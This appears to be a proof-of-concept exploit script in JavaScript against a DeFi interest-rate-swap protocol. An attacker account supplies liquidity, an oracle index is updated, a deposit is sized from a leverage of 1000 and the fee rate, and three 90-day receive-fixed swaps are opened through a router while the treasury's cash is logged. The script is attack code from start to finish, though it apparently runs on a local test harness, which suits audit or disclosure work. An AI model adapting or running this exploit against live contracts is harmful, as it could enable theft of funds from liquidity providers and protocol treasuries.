const { main, RISK_BASE, signRisk, E18, PAD } = require('./poc');
(async () => {
  const c = await main({ openingFeeRate: 5n * 10n ** 14n });
  const { P, usdc, oracle, provider, atk, lp, msgSignerWallet, pools, openViaRouter } = c;
  const atkAddr = await atk.getAddress(), lpAddr = await lp.getAddress();
  await c.give(lp, PAD(1_000_000)); await c.give(atk, PAD(5_000_000));
  await (await pools.connect(lp).provideLiquidityUsdc(lpAddr, PAD(1_000_000), { gasLimit: 5e6 })).wait();
  await (await pools.connect(atk).provideLiquidityUsdc(atkAddr, PAD(1_000_000), { gasLimit: 5e6 })).wait();
  await (await oracle.updateIndexes([{ asset: P.usdc, indexValue: 5n * 10n ** 16n, updateTimestamp: 0n, quasiIbtPrice: 0n }])).wait();
  const lev = 1000n * E18, k = (lev * 5n * 10n ** 14n * 90n) / (365n * E18);
  const total = ((PAD(74_000) * 10n ** 12n * (E18 + k)) / E18 + 35n * E18) * 10n ** 6n / E18 + 2n;
  const now = BigInt((await provider.getBlock('latest')).timestamp);
  for (let i = 0; i < 3; i++) {
    const ins = { ...RISK_BASE, expiration: now + 3600n + BigInt(i) };
    try {
      await (await openViaRouter.connect(atk).openSwapReceiveFixed90daysUsdc(atkAddr, total, 0n, lev,
        { ...ins, signature: signRisk(msgSignerWallet, ins, P.usdc, 2n, 1n) }, { gasLimit: 9e6 })).wait();
      console.log(`swap ${i}: ok  cash=${(await usdc.balanceOf(P.treasury)).toString()}`);
    } catch (e) {
      console.log(`swap ${i}: REVERT ${(e.shortMessage||'').slice(0,120)}`);
    }
  }
})();
